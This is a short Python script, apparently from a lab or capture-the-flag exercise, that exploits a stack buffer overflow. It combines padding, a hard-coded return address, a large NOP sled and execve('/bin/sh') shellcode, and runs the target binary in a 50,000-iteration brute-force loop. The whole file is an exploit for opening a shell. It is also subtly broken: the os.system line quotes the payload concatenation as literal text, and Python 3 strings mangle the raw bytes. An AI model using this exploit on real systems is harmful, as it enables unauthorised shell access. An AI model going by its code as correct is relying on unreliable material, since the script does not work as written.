#!/usr/bin/python3

import os

for _ in range(50000):
	padding = 'A' * 171

	#Address to use. Choose an address that is a little more into our NOP sled
	address = '\x89\xf2\xff\xbf'

	nopSleds = '\x90' * 50000

	shellcode = ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68'
				'\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89'
				'\xca\x6a\x0b\x58\xcd\x80')

	payload = padding + address + nopSleds + shellcode

	#In my case the vulnerable binary is in door2
	os.system("/SECRET/door2/file + ' ' + payload")